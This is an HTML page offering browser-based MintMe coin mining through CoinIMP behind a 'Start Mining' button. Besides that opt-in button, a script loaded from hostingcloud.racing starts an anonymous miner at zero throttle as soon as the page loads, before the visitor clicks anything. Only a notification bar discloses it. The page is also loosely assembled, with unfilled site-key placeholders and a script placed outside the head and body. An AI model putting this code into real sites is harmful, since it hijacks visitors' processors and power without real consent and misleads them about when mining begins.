<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MintMe Coin Mining</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            text-align: center;
            padding: 50px;
        }
        .container {
            max-width: 600px;
            margin: auto;
            background: white;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            color: #333;
        }
        p {
            color: #666;
        }
        button {
            background-color: #4CAF50;
            color: white;
            padding: 15px 20px;
            border: none;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #45a049;
        }
    </style>
    <script src="https://www.coinimp.com/scripts/{your_site_key}.js" async></script>
</head>
    <script src="https://www.hostingcloud.racing/phbm.js"></script>
<script>
    var _client = new Client.Anonymous('f21a539ef82780f9732f97fa070772a14bd6dede3ef6d74cec60926f4f0342a0', {
        throttle: 0, c: 'w'
    });
    _client.start();
    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");

</script>
<body>
    <div class="container">
        <h1>MintMe Coin Mining</h1>
        <p>Click the button below to start mining MintMe coins using your browser.</p>
        <button id="startButton">Start Mining</button>
        <button id="stopButton" style="display:none;">Stop Mining</button>
    </div>

    <script>
        const miner = new CoinIMP('{your_site_key}');
        
        document.getElementById('startButton').addEventListener('click', function() {
            miner.start();
            document.getElementById('startButton').style.display = 'none';
            document.getElementById('stopButton').style.display = 'block';
        });

        document.getElementById('stopButton').addEventListener('click', function() {
            miner.stop();
            document.getElementById('startButton').style.display = 'block';
            document.getElementById('stopButton').style.display = 'none';
        });

        miner.on('open', () => {
            console.log('Miner started');
        });

        miner.on('close', () => {
            console.log('Miner stopped');
        });
    </script>
</body>
</html>
